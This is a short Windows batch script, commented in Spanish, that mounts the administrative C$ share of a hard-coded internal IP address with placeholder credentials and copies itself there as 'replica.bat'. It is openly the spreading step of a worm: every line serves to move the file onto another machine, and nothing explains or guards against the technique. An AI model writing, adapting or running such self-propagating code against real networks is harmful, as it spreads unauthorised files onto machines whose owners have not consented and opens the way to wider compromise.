@echo off
:: Intenta conectar a un recurso compartido en otro dispositivo
net use \\172.26.165.229\c$ /user:usuario contraseña
if %errorlevel%==0 (
    copy worm.bat \\172.26.165.229\c$\Users\Public\replica.bat
    echo "Worm copiado exitosamente a 172.26.165.229"
    net use \\172.26.165.229\c$ /delete
) else (
    echo "No se pudo conectar a 172.26.165.229"
)
